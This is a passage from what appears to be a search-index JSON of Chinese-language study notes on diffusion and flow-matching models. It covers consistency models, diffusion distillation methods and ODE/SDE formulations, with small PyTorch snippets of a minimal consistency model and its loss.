<p>\u8fde\u7eed\u7684\u4e00\u81f4\u6027\u6a21\u578b\uff0c\u5f88\u663e\u7136\u7684\uff0c\u5c31\u662f\u5c06\u4e0a\u8ff0\u76ee\u6807\u516c\u5f0f\u4e2d\u7684\\(\\Delta t\\)\u8d8b\u8fd1\u4e8e0\uff0c\u907f\u514d\u4e86\u9700\u8981\u8fdb\u884cODE\u6c42\u89e3\u5bfc\u81f4\u7684\u8bef\u5dee\u7d2f\u79ef\u95ee\u9898\uff0c\u4f46\u662f\u5b9e\u8df5\u53d1\u73b0\uff0c\u8fd9\u79cdcCM\u7684\u8bad\u7ec3\u76f8\u5f53\u5730\u4e0d\u7a33\u5b9a</p> <p>CM\u7684\u8bad\u7ec3\u6709\u4e24\u79cd\u65b9\u5f0f\uff0c\u4e00\u79cd\u662f\u4ece\u5934\u5f00\u59cb\u8bad\u7ec3\uff0c\u4e00\u79cd\u662f\u84b8\u998f\u73b0\u6709\u7684Diffusion Model</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/Diffusion_and_flow/Consistency%20model/#12-simplifying-continuous-time-consistency-model","title":"1.2 Simplifying Continuous-Time Consistency Model","text":"<p>\u65e9\u8d77\u7684CM\u4eff\u7167\u4e86EDM\u4e2d\u7684\u6a21\u578b\u53c2\u6570\u7ed3\u6784\uff0c\u5176\u53c2\u6570\u7684\u6784\u6210\u8f83\u4e3a\u590d\u6742</p> <p>\u6587\u7ae0\u63d0\u51faTrigFlow\uff0c\u63d0\u51fa\u4e86\u4e00\u79cd\u7684\u65b0\u7684\u53c2\u6570\u5316\u65b9\u6848\uff0c\u5229\u7528\u4e09\u89d2\u51fd\u6570\uff0c\u8be5\u5f62\u5f0f\u662fFlow Matching\u7684\u4e00\u79cd\u7279\u4f8b</p> <p>\u8fd9\u91cc\u7684\u8bc1\u660e\u8fd8\u9700\u8981\u770b\u4e00\u4e0b</p> <p></p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/Diffusion_and_flow/Consistency%20model/#13-stabilizing-continuous-time-consistency-model","title":"1.3. Stabilizing Continuous-Time Consistency Model","text":""},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/Diffusion_and_flow/Consistency%20model/#2-rcm","title":"2. rCM","text":"<p>\u5c1d\u8bd5Scale up sCM\uff0c\u9762\u4e34\u7684\u6311\u6218</p> <ul> <li>JVP Computation Infra</li> <li>Evaluation Benchmark</li> </ul> <p>\u6587\u7ae0\u63d0\u51fa\u4e86\u4e00\u4e2a\u57fa\u4e8eFlashAttention 2\u7684JVP Kernel\uff0c\u80fd\u591f\u4f7f\u5f97sCM\u6a21\u578b\u572810B+\u7684\u53c2\u6570\u4e0a\u8bad\u7ec3\uff0c\u5e76\u4e14\u5728\u6b64\u8fc7\u7a0b\u4e2d\u53d1\u73b0\u4e86\u4e4b\u524dsCM\u7684\u7f3a\u9677\uff0c\u5e76\u4e14\u63d0\u51fa\u4e86rCM\u7684\u67b6\u6784\u6765\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/Diffusion_and_flow/Consistency%20model/#21-infra","title":"2.1. Infra","text":"<p>\u770bKernel\u7684\u5b9e\u73b0</p> <ul> <li>Flash Attention</li> <li>FSDP</li> <li>Context Parallelism</li> </ul>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/Diffusion_and_flow/Consistency%20model/#22-algorithm","title":"2.2. Algorithm","text":"<p>sCM\u84b8\u998f\u603b\u662f\u5728\u4e00\u4e9b\u5178\u578b\u63d0\u793a\u4e0a\u505a\u5f97\u5f88\u597d\uff0c\u4f46\u662f\u5728\u4e00\u4e9b\u590d\u6742\u63d0\u793a\u4e0a\uff0c\u6307\u4ee4\u9075\u5faa\u4e0b\u964d\uff0c\u5e76\u4e14\u65e0\u6cd5\u901a\u8fc7\u7b80\u5355\u7684scale up\u6765\u89e3\u51b3\uff0c\u53ef\u4ee5\u53d1\u73b0\u8fd9\u91cc\u662f\u5b58\u5728\u4e00\u4e2a\u8bef\u5dee\u7d2f\u79ef\u7684\u95ee\u9898\uff0c\u6784\u6210\u8bef\u5dee\u7d2f\u79ef\u7684\u56e0\u7d20\u6709\u5f88\u591a\uff0c\u6bd4\u5982CM\u7684\u76ee\u6807\u662f\u5728one step\u53bb\u62df\u5408\u6559\u5e08\u6a21\u578b\u7684ODE\u6d41\uff0c\u4f46\u662f\u6b64\u65f6\u5982\u679c\u4ea7\u751f\u4e00\u70b9\u504f\u5dee\uff0c\u5728\u540e\u7eed\u6b65\u9aa4\u4e2d\u8be5\u504f\u5dee\u4f1a\u88ab\u653e\u5927</p> <p>\u9488\u5bf9\u4e8e\u6b64\u79cd\u73b0\u8c61\uff0c\u672c\u6587\u63d0\u51fa\u4e86\u4e00\u79cd\u53eb\u505arCM\u7684\u65b9\u5f0f\uff0c\u505aScore-Regularized sCM</p> <p></p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/Diffusion_and_flow/Consistency%20model/#code","title":"Code","text":"<p>\u4e00\u81f4\u6027\u6a21\u578b\u7684Loss\u8ba1\u7b97</p> <pre><code>        # \u4e24\u4e2a\u76f8\u90bb\u65f6\u95f4\u6b65\n        t1 = torch.rand(128) * 0.9 + 0.1\n        t2 = torch.clamp(t1 - 0.1, min=0.01)\n\n        # \u52a0\u566a\u58f0\n        noise = torch.randn_like(batch)\n        x1 = batch + t1.view(-1, 1) * noise\n        x2 = batch + t2.view(-1, 1) * noise\n\n        # \u4e00\u81f4\u6027\u635f\u5931\uff1a\u4e24\u4e2a\u9884\u6d4b\u5e94\u8be5\u63a5\u8fd1\n        loss = F.mse_loss(model(x1, t1), model(x2, t2))\n</code></pre> <p>\u4e00\u81f4\u6027\u6a21\u578b\u7684\u8bad\u7ec3\u5185\u5bb9\u5982\u4e0b\uff0c\u53d6\u4e24\u4e2a\u65f6\u95f4\u6b65\uff0c\u5e76\u4e14\u8ba9\u4e24\u4e2a\u65f6\u95f4\u6b65\u9884\u6d4b\u51fa\u6765\u7684\u5185\u5bb9\u5c3d\u53ef\u80fd\u76f8\u4f3c</p> <pre><code>class MinimalConsistencyModel(nn.Module):\n    \"\"\"\u6700\u5c0f\u4e00\u81f4\u6027\u6a21\u578b - \u53ea\u5305\u542b\u6838\u5fc3\u903b\u8f91\"\"\"\n\n    def __init__(self, dim=2):\n        super().__init__()\n        self.net = nn.Sequential(\n            nn.Linear(dim + 1, 64), nn.ReLU(),\n            nn.Linear(64, dim)\n        )\n\n    def forward(self, x, t):\n        \"\"\"x: \u6570\u636e, t: \u65f6\u95f4\u6b65\"\"\"\n        # \u62fc\u63a5\u8f93\u5165\n        inp = torch.cat([x, t.view(-1, 1)], dim=1)\n\n        # Skip connection: \u5f53t\u21920\u65f6\u8f93\u51fa\u2192x\n        return (1 - t.view(-1, 1)) * x + t.view(-1, 1) * self.net(inp)\n</code></pre> <p>\u5e76\u4e14\u786e\u4fdd\u5728t=0\u7684\u65f6\u5019\uff0c\u8f93\u51fa\u4e3a\u771f\u5b9e\u56fe\u7247\u5373\u53ef</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/Diffusion_and_flow/Diffusion%20Distillation/","title":"Diffusion Distillation","text":"<p>\u8fd9\u7bc7\u6587\u7ae0\u4f1a\u7528\u6765\u5206\u4eab\u4e00\u4e9b\u6709\u5173\u4e8eDiffusion&amp;Flow\u52a0\u901f\u76f8\u5173\u7684\u5de5\u4f5c</p> <p>\u8fd9\u91cc\u7684\u4e3b\u8981\u5185\u5bb9\u6765\u81ea\u4e8e\u8fd9\u7bc7\u6587\u7ae0 \uff0c\u4e00\u7bc7Distillation Guide\uff0c\u4e3b\u8981\u662f\u5bf9\u4e8eText-to-Image\uff0c\u8fd9\u7bc7\u6587\u7ae0\u5c06Diffusion\u7684\u84b8\u998f\u5212\u5206\u4e3a\u4e86\u4e24\u4e2a\u8303\u5f0f\uff0c\u4ece\u5206\u5e03\u548c\u8f68\u8ff9\u89d2\u5ea6\u8fdb\u884c\u62df\u5408\u6559\u5e08\u6a21\u578b</p> <ul> <li>Distribution Distillation: \u5305\u62ecDMD\uff0cLADD</li> <li>Trajectory-based Distillation: \u5305\u62ecsCM\uff0cIMM\uff0cMeanFlow</li> </ul> <p>\u5176\u4e2dDistributon Distilation\u7684\u8303\u5f0f\u5df2\u7ecf\u6709\u4e86\u5f88\u591a\u5b9e\u8df5\u9a8c\u8bc1\uff0c\u6bd4\u5982Qwen-Image-Lighting\u548cFlux.1 Kontext dev\u90fd\u4f7f\u7528\u4e86\u4e0a\u8ff0\u6280\u672f\uff0c\u4f46\u662f\u8fd9\u4e09\u79cdTrajectory-based Distillation\u7684\u65b9\u6848\uff0c\u5374\u53ea\u662f\u5728\u5c0f\u89c4\u6a21\uff08ImageNet\uff09\u4e2d\u505a\u4e86\u9a8c\u8bc1\uff0c\u8fd9\u7bc7\u8bba\u6587\u4e3a\u8fd9\u4e9b\u65b9\u6848\u90fd\u52a0\u5165\u66f4\u591a\u7684\u5b9e\u9a8c\uff0c\u63d0\u4f9b\u4e86\u5f88\u591a\u7684Insights</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/Diffusion_and_flow/Diffusion%20Distillation/#1-method-overview","title":"1. Method Overview","text":""},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/Diffusion_and_flow/Diffusion%20Distillation/#11-scm","title":"1.1. sCM","text":"<p>\u7528 TrigFlow \u7684\u8303\u5f0f\u6765\u7a33\u5b9a continuous consistecny model \u7684\u8bad\u7ec3\uff0c\u5305\u62ec\u67b6\u6784\u4e0a\u7684\u6539\u52a8\uff0c\u4ee5\u53ca\u4e00\u4e9b\u52a0\u6743</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/Diffusion_and_flow/Diffusion%20Distillation/#12-meanflow","title":"1.2. MeanFlow","text":"<p>Flow Matching\u5b66\u4e60\u77ac\u65f6\u901f\u5ea6\u800cMeanflow\u5b66\u4e60\u5e73\u5747\u901f\u5ea6\uff0c\u8f93\u5165\u4e24\u4e2a\u65f6\u95f4\u70b9\uff0c\u8ba1\u7b97\u5e73\u5747\u901f\u5ea6</p> <p>\u672c\u6587\u4e3aMeanFlow\u63d0\u51fa\u4e86\u4e00\u4e2a\u84b8\u998f\u65b9\u6848\uff0cMeanFlow\u4e5f\u662f\u4e00\u4e2a\u53ef\u4ee5\u84b8\u998f\u53ef\u4ee5\u4ece\u5934\u8bad\u7ec3\u7684\u8303\u5f0f</p> <p></p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/Diffusion_and_flow/Diffusion%20Distillation/#13-imm","title":"1.3. IMM","text":"<p>\u66ff\u4ee3KL\u65b9\u6848\uff0cIMM\u63d0\u51fa\u4e86\u4e00\u79cdMMD\u7684\u65b9\u6848\uff0c\u6765\u8861\u91cfdistirbutional difference</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/Diffusion_and_flow/Diffusion%20Distillation/#2-comparative-insights","title":"2. Comparative Insights","text":""},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/Diffusion_and_flow/Diffusion%20Distillation/#21-flow-matching-meanflow","title":"2.1. Flow matching &amp; MeanFlow","text":"<p>Flow Matching\u548cMeanFlow\u7684\u5173\u7cfb\u53ef\u4ee5\u7406\u89e3\u4e3a\uff0cFM\u662f\u4e00\u79cdMeanFlow\u7684\u7279\u6b8a\u60c5\u51b5\uff0c\u4e5f\u5373r=t\u7684\u65f6\u5019\uff0c\u6b64\u65f6MeanFlow\u7684\u76ee\u6807\u5c31\u662f\u5728\u9884\u6d4b \\(\\boldsymbol{v}\\) </p> <p></p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/Diffusion_and_flow/Diffusion%20Distillation/#22-fm-scm","title":"2.2. FM &amp; sCM","text":"<p>FM\u548cTrigFlow\u5728\u63a8\u7406\u4e2d\u662f\u53ef\u4ee5\u4e92\u76f8\u8f6c\u6362\u7684\uff0c\u8868\u73b0\u4e3a\uff0c\u7528\u4e00\u79cd\u65b9\u6848\u8bad\u7ec3\u7684\u6a21\u578b\uff0c\u53ef\u4ee5\u7528\u53e6\u4e00\u5957\u8303\u5f0f\u7684Sampler\uff0c\u800c\u6ca1\u6709\u4efb\u4f55\u7684\u80fd\u529b\u9000\u5316\uff0c\u53ea\u9700\u8981\u901a\u8fc7\u4e00\u4e9b\u7ebf\u5f62\u7ec4\u5408</p> <p>\u7528TrigFlow Sample\u8fd0\u884cFM</p> <p></p> <p>\u7528FM Sample\u8fd0\u884cTrigFlow</p> <p></p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/Diffusion_and_flow/Diffusion%20Distillation/#23-scm-meanflow","title":"2.3. sCM &amp; Meanflow","text":""},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/Diffusion_and_flow/Diffusion%20Distillation/#24-cm-imm","title":"2.4. CM &amp; IMM","text":""},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/Diffusion_and_flow/Diffusion%20Distillation/#dmd","title":"DMD","text":""},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/Diffusion_and_flow/Diffusion%20and%20flow%20matching/","title":"Diffusion and flow matching","text":"<p>\u672c\u6587\u6765\u81ea\u4e8eMIT\u7684\u8fd9\u4efdNotes</p> <p>An Introduction to Flow Matching and Diffusion Models</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/Diffusion_and_flow/Diffusion%20and%20flow%20matching/#1-introduction","title":"1. Introduction","text":"<p>\u73b0\u9636\u6bb5AI\u7684\u70ed\u6f6e\u5728\u4e8e\u6784\u5efa\u4f18\u79c0\u7684\u751f\u6210\u6a21\u578b\uff0c\u5728\u5176\u4e2d\u6700\u4e3a\u6210\u529f\u7684\u6a21\u578b\u4e4b\u4e8c\u4fbf\u662fDiffusion\u548cFlow model\uff1bDiffusion and Flow model\u57fa\u4e8eODE/SDE\u6765\u6a21\u62df\u566a\u58f0\u5230\u6570\u636e\u7684\u53d8\u5316\u8fc7\u7a0b\uff0c\u867d\u7136\u4ece\u4ee3\u7801\u4e0a\uff0c\u8fd9\u4e9b\u6a21\u62df\u8fc7\u7a0b\u90fd\u76f8\u5f53\u7b80\u5355\uff0c\u4f46\u662fSDE\u7684\u6280\u672f\u6027\u8d28\u4f1a\u4f7f\u5176\u770b\u4e0a\u53bb\u96be\u4ee5\u7406\u89e3\uff0c\u5c24\u5176\u662f\u5404\u79cd\u4f18\u5316\u65b9\u6848</p> <p>\u503c\u5f97\u4e00\u63d0\u7684\u662f\uff0cDiffusion\u7684\u6a21\u578b\u7684\u6700\u521d\u63d0\u51fa\u7684\u7406\u8bba\u57fa\u7840\u5e76\u4e0d\u662fSDE\uff0c\u800c\u662f\u540e\u7eed\u4eba\u4eec\u5728\u4f18\u5316Diffusion\u548c\u63a2\u7d22Flow model\u548cDiffuion model\u8054\u7cfb\u7684\u8fc7\u7a0b\u4e2d\uff0c\u53d1\u73b0\u8fd9\u4e24\u4e2a\u6a21\u578b\u7684\u6570\u5b66\u672c\u8d28\uff0cODE/SDE\u662f\u5176\u6700\u672c\u8d28\u7684\u6570\u5b66\u7406\u89e3\uff0c\u6211\u4eec\u5728\u672c\u6587\u4e2d\u4e5f\u4f1a\u4ecb\u7ecd\u4e00\u4e9b\u5176\u4ed6\u7684</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/Diffusion_and_flow/Diffusion%20and%20flow%20matching/#11-some-concepts","title":"1.1 Some Concepts","text":"<p>\u6211\u4eec\u5728\u672c\u8282\u5217\u51fa\u6240\u6709\u7684\u6982\u5ff5\uff0c\u548c\u4e0b\u9762\u516c\u5f0f\u4e2d\u7684\u8868\u8ff0\u4e00\u4e00\u5bf9\u5e94</p> <ul> <li>\\(R^d\\): \u6307\u7684\u662fd\u7ef4\u7684\u5b9e\u6570\u5411\u91cf</li> <li>\\(X\\): \u4e00\u6761\u8f68\u8ff9Function\uff0c\u7ed9\u4f60\u65f6\u95f4\uff0c\u53ef\u4ee5\u83b7\u5f97\u5bf9\u5e94\u7684\u70b9\u7684\u5750\u6807\\(X_t\\)\u6216\u8005\u6211\u4eec\u4e5f\u7528 \\(x\\) \u6765\u8868\u793a</li> <li>\\(u\\): \u662f\u6307\u901f\u5ea6\uff0c\u901f\u5ea6\u662f\u65f6\u95f4\u548c\u4f4d\u7f6e\u7684\u51fd\u6570\uff0c \\(u_t(x)\\)</li> <li>\\(z\\): \u662f\u6307\u771f\u5b9e\u6570\u636e\u4e0a\u7684\u4e00\u4e2a\u70b9</li> <li>\\(p(\u00b7|z)\\) \u548c \\(p(x|z)\\) \u672c\u8d28\u4e0a\u662f\u4e00\u4e2a\u4e1c\u897f\uff0c\u4e00\u4e2a\u6307\u7684\u662f\u5206\u5e03\uff0c\u4e00\u4e2a\u6307\u7684\u662f\u5bf9\u4e8ex\u7684\u6982\u7387</li> </ul>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/Diffusion_and_flow/Diffusion%20and%20flow%20matching/#2-flow-and-diffusion-models","title":"2. Flow and Diffusion Models","text":"<p>Flow model \u548c Diffusion model \u5206\u522b\u5728\u6a21\u62dfODE\u548cSDE\u8fc7\u7a0b</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/Diffusion_and_flow/Diffusion%20and%20flow%20matching/#21-flow-models","title":"2.1 Flow Models","text":"<p>\u6211\u4eec\u4eceODE\u8fc7\u7a0b\u5f00\u59cb\uff0cODE\u7684\u89e3\u662f\u4e00\u4e2a\u8f68\u8ff9\uff0c\u5176\u4ece\u65f6\u95f4 t \u6620\u5c04\u5230\u7a7a\u95f4\\(R^d\\) \uff0c\u4efb\u4f55\u4e00\u4e2a\u6837\u672c\u90fd\u662f\u8fd9\u4e2a\u7a7a\u95f4\u4e2d\u7684\u4e00\u4e2a\u70b9\uff0c\u4e0d\u8bba\u662f\u56fe\u50cf\uff0c\u89c6\u9891\u6216\u8005\u662f\u86cb\u767d\u8d28\u7ed3\u6784</p> <p>ODE\u7684\u89e3\u662f\u4e00\u4e2a\u8f68\u8ff9\uff0c\u4e0b\u9762\u8fd9\u4e2a\u5f0f\u5b50\u4e2d\u7684X\u662f\u4e00\u4e2afunction\u5982\u4e0b\uff0ct\u4ece[0, 1]\u7684\u8303\u56f4\u4e2d\u53d6\uff0c\u77e5\u9053t\u4f60\u80fd\u591f\u63a8\u51fa\u5176\u5728\u8fd9\u4e2a\u7a7a\u95f4\u4e2d\u7684\u4f4d\u7f6e\uff0c\u8fd9\u5c31\u662f\u6240\u8c13\u7684\u89e3\u662f\u4e00\u4e2a\u8f68\u8ff9</p> \\[ X:[0,1]\\rightarrow R^d,\\ \\ \\ t\\rightarrow X_t \\] <p>\u5bf9\u4e8e\u6bcf\u4e2a\u65f6\u95f4\u548c\u4f4d\u7f6e\uff0cODE\u4f1a\u5b9a\u4e49\u4e00\u4e2avector field\u6765\u544a\u8bc9\u4f60\u5728\u8fd9\u4e2a\u5730\u65b9\u7684\u901f\u5ea6\u5411\u91cfu\uff0cu\u662f\u4e00\u4e2afunction\uff0c\u5982\u4e0b</p> \\[ u:R^d \\times [0,1]\\rightarrow R^d ,\\ \\ \\ (x,t)\\rightarrow u_t(x) \\] <p>\u5728\u5b9e\u8df5\u4e2d\uff0c\u5411\u91cf\u573au\u5f80\u5f80\u975e\u5e38\u590d\u6742\uff0c\u56e0\u6b64\u65e0\u6cd5\u76f4\u63a5\u8ba1\u7b97\u79ef\u5206\u89e3\u51b3\uff0c\u4e00\u822c\u662f\u901a\u8fc7\u6b27\u62c9\u6cd5\uff0c\u5206\u6b65\uff0c\u5047\u8bbe\u5355\u6b65\u4e4b\u5185\u7684\u901f\u5ea6\u662f\u4e0d\u53d8\u7684\uff0c\u8fdb\u884c\u8ba1\u7b97\u89e3\u51b3</p> \\[ X_{t+h}=X_t +hu_t(X_t)\\ \\ \\ \\ (t=0,h,2h,...,1-h) \\] <p>\u57fa\u4e8e\u6b27\u62c9\u6cd5\uff0c\u6211\u4eec\u53ef\u4ee5\u7528\u795e\u7ecf\u7f51\u7edc\u8fdb\u884c\u5efa\u6a21\uff0c\u5373\u7528\u795e\u7ecf\u7f51\u7edc\u6765\u62df\u5408\u6bcf\u4e2astep\u7684\u53d8\u5316\uff0c\u4e5f\u5373 \\(u_t\\) \u7531\u6b64\uff0c\u6211\u4eec\u6765\u63d0\u4f9bFlow Model\u7684\u5b8c\u6574\u5b9a\u4e49\uff0c\u5982\u4e0b</p> \\[ X_0\\sim p_{init}\\ \\ \\ \\ \\triangleright \\textrm{init function} \\] \\[ \\frac{d}{dt}X_t=u_t^{\\theta}(X_t) \\ \\ \\ \\ \\triangleright \\textrm{speed function} \\] \\[ X_1\\sim p_{data} \\ \\ \\ \\ \\triangleright \\textrm{final state function} \\] <p>\u503c\u5f97\u6ce8\u610f\u7684\u662f\u795e\u7ecf\u7f51\u7edc\u62df\u5408\u7684\u662fVector field\uff08\u4e5f\u5373\u6bcf\u4e2a\u70b9X\u5728t\u7684\u901f\u5ea6\uff09\u800c\u4e0d\u662fFlow\uff0c\u4e3a\u4e86\u8ba1\u7b97Flow\uff0c\u6211\u4eec\u9700\u8981\u57fa\u4e8eVector field+\u6b27\u62c9\u6cd5\u6a21\u62dfODE</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/Diffusion_and_flow/Diffusion%20and%20flow%20matching/#22-diffusion-models","title":"2.2  Diffusion Models","text":"<p>Diffusion model\u57fa\u4e8eSDE\uff0cSDE\u662fODE\u7684\u4e00\u79cd\u901a\u5e38\u60c5\u51b5\uff0c\u5728ODE\u7684\u57fa\u7840\u4e0a\u5f15\u5165\u4e86\u968f\u673a\u6270\u52a8\uff0c\u968f\u673a\u6270\u52a8\u662f\u4e00\u79cd\u57fa\u4e8e\u9ad8\u65af\u8fd0\u52a8\u7684\u968f\u673a\u53d8\u5316\uff0c\u6211\u4eec\u7528\u5e03\u6717\u8fd0\u52a8\u6765\u63cf\u8ff0\u5b83</p> <p>\u5e03\u6717\u8fd0\u52a8(Brownian Motion)\uff1a\u4ece\u76f4\u89c2\u4e0a\u8bb2\uff0c\u5e03\u6717\u8fd0\u52a8\u662f\u4e00\u6bb5\u8fde\u7eed\u5730\u968f\u673a\u6e38\u8d70\uff0c\u6570\u5b66\u8868\u793a\u8bb0\u4e3a \\(W = (W_t)_{0\\leq t \\leq 1}\\) \uff0c\u5e03\u6717\u8fd0\u52a8\u6709\u4ee5\u4e0b\u7279\u6027\uff1a 1. \u5e03\u6717\u8fd0\u52a8\u7684\u589e\u91cf\u4e3a\u9ad8\u65af\u5206\u5e03\uff0c\u4e5f\u5373\u5176\u8fd0\u52a8\u5206\u5e03\u7684\u65b9\u5dee\u4f1a\u968f\u7740\u65f6\u95f4\u7ebf\u6027\u589e\u52a0 2. \u5e03\u6717\u8fd0\u52a8\u4efb\u610f\u65f6\u95f4\u8282\u70b9\u7684\u589e\u91cf\u662f\u4e00\u4e2a\u72ec\u7acb\u968f\u673a\u53d8\u91cf \u7531\u4e0a\u9762\u4e24\u4e2a\u7279\u6027\u53ef\u77e5\uff0c\u5e03\u6717\u8fd0\u52a8\u6ee1\u8db3 \\(W_{t+h}=W_t+\\sqrt{h}\\varepsilon_t\\ \\ \\ \\ \\varepsilon\\sim N(0,I_d)\\) </p> <p>\u5bf9\u4e8e\u4e00\u4e2aODE\u800c\u8a00\uff0c\u53ea\u8981\u521d\u59cb\u503c\u76f8\u540c\uff0c\u5176\u6a21\u62df\u7684\u7ed3\u679c\u4e5f\u4f1a\u76f8\u540c\uff0c\u800c\u5bf9\u4e8e\u4e00\u4e2aSDE\u800c\u8a00\u5219\u4e0d\u662f\u8fd9\u6837\uff0cSDE\u662f\u4e00\u4e2a\u968f\u673a\u8fc7\u7a0b\uff0c\u5bf9\u4e8eSDE\u6765\u8bf4\uff0c\u8fd0\u52a8\u7684\u8f68\u8ff9\u6bcf\u6b21\u90fd\u662f\u4e0d\u4e00\u6837\u7684\uff0c\u5e76\u4e14\u6bcf\u4e00\u72b6\u6001\u90fd\u662f\u4e00\u4e2a\u968f\u673a\u53d8\u91cf\u800c\u975e\u662f\u4e00\u4e2a\u70b9</p> <p>\u4eceODE\u5230SDE\u7684\u8fc7\u7a0b\u5c31\u662f\u589e\u52a0\u4e86\u4e00\u4e2a\u5e03\u6717\u8fd0\u52a8\u7684\u968f\u673a\u6270\u52a8</p> \\[ X_{t+h}=X_t+hu_t(X_t)+\\sqrt{h}\\sigma_t\\varepsilon_t\\ \\ \\ \\ \\varepsilon\\sim N(0,I_d) \\] <p>\u7531\u6b64\u884d\u751f\u51fa\u57fa\u4e8e\u6b27\u62c9\u6cd5\u7684Euler-Maruyama method\uff0c\u5728\u6bcf\u4e00step\u91cc\u9762\u589e\u52a0\u4e00\u4e2a\u968f\u673a\u6270\u52a8\uff0c\u8fd9\u4e2a\u6270\u52a8\u4e2d\u6709\u4e00\u4e2a\u8d85\u53c2\u6570\u63a7\u5236\u6270\u52a8\u7684size\uff0c\u5f53\u5176\u4e3a0\u7684\u65f6\u5019\uff0cSDE\u8f6c\u5316\u6210ODE</p> <p>\u59cb\u7ec8\u8bb0\u4f4f\uff0c\u6211\u4eec\u7684\u76ee\u6807\u662f\u8bb2\u7b80\u5355\u7684\u5206\u5e03\u8f6c\u6362\u6210\u590d\u6742\u7684\u771f\u5b9e\u5206\u5e03\uff0c\u540c\u6837\u5730\uff0c\u6211\u4eec\u4f1a\u53c2\u6570\u5316\uff08\u795e\u7ecf\u7f51\u7edc\u62df\u5408\uff09\\(u_t\\) , \u552f\u4e00\u5730\u533a\u522b\u662f\u6211\u4eec\u5728\u8fd9\u8fb9\u52a0\u4e0a\u4e86\u4e00\u4e2a\u57fa\u4e8e\u9ad8\u65af\u5206\u5e03\u7684\u968f\u673a\u6270\u52a8</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/Diffusion_and_flow/Diffusion%20and%20flow%20matching/#3-constructing-the-training-target","title":"3. Constructing the Training Target","text":"<p>\u5bf9\u4e8eFlow model\u548cDiffusion model</p> <p></p> <p>\u5b9e\u9645\u8981\u8bad\u7ec3\u7684\u53c2\u6570\u662f\u4e00\u81f4\u7684</p> <p></p> <p>\u59cb\u7ec8\u7262\u8bb0\u8fd9\u4e2a\u53c2\u6570\u5316\u7684\u901f\u5ea6\u662f\u6307\u521d\u59cb\u5206\u5e03\u8f6c\u79fb\u5230\u76ee\u6807\u5206\u5e03\u7684\u901f\u5ea6\uff0c\u4e5f\u5373\u6211\u4eec\u8981\u62df\u5408\u7684\u662f\u8fd9\u4e2a\u901f\u5ea6</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/Diffusion_and_flow/Diffusion%20and%20flow%20matching/#31-conditional-and-marginal-proability-path","title":"3.1 Conditional and Marginal Proability Path","text":"<p>\u6211\u4eec\u7684\u8bad\u7ec3\u76ee\u6807\uff0c\u5c31\u662f\u8fd9\u4e2a\u5206\u5e03\u8f6c\u6362\u7684\u8fc7\u7a0b\uff0c\u5b9e\u9645\u4e0a\u662f\u4e00\u4e2a\u6982\u7387\u8def\u5f84\uff0c\u4e5f\u5373\u4e00\u4e2a\u6982\u7387\u5206\u5e03\u968f\u7740\u65f6\u95f4\u6f14\u53d8\u7684\u8fc7\u7a0b\uff0c\u4e5f\u5373\u4ece\u6700\u521d\u7684\u539f\u59cb\u5206\u5e03\u5230\u6700\u7ec8\u7684\u771f\u5b9e\u6570\u636e\u5206\u5e03\u7684\u8fc7\u7a0b</p> <p>\u6211\u4eec\u9996\u5148\u5b9a\u4e49\u6761\u4ef6\u6982\u7387\u8def\u5f84\uff08conditional probability 